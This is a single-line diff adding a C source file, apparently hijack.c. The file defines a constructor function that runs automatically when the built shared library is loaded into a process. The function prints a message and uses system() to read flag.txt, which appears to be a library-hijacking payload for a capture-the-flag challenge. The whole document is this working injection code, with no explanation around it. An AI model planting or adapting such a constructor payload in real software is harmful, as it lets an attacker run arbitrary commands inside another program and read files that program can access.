@@ -1,0 +1,1 @@
+void init(){printf("Code in hijack.c executed!\n");system("cat flag.txt");}__attribute__((constructor))void hijack_init(){init();}
